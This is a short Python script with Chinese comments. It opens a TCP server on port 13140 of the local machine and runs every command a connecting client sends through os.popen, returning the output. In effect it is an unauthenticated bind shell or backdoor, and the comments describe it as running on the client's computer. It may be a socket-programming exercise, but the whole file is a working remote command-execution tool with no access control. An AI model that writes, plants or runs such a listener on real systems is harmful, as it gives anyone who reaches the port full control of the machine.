import socket
import os 
from lib import *


host_ip = helper.get_host_ip()
target_host = host_ip       # 这是客户端的电脑的ip
target_port = 13140         # 接口选择大于10000的，避免冲突
addr = (target_host,target_port)
bufsize = 1024              # 定义缓冲大小

# 建立一个socket对象
tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpServer.bind(addr)
tcpServer.listen(5) # 这里设置监听数为5(默认值),有点类似多线程。

while True:
    print('Waiting for connection...')
    tcpClient,addr = tcpServer.accept() # 拿到5个中一个监听的tcp对象和地址
    print('[+]...connected from:',addr)

    while True:
        cmd = tcpClient.recv(bufsize).decode(encoding="utf-8") 
        print('   [-]cmd:',cmd)
        if not cmd:
            break

        # 这里在cmd中执行来自客户端的命令，并且将结果返回
        cmd = os.popen(cmd)         # os.popen(cmd)对象是file对象子类，所以可以file的方法
        cmdResult = cmd.read()
        cmdStatus = cmd.close()

        #################################################
        data = cmdResult if (not cmdStatus) else "ERROR COMMAND"
        tcpClient.send(data.encode(encoding="utf-8"))
 
    tcpClient.close() #
    print(addr,'End')

tcpServer.close() # 两次关闭，第一次是tcp对象，第二次是tcp服务器



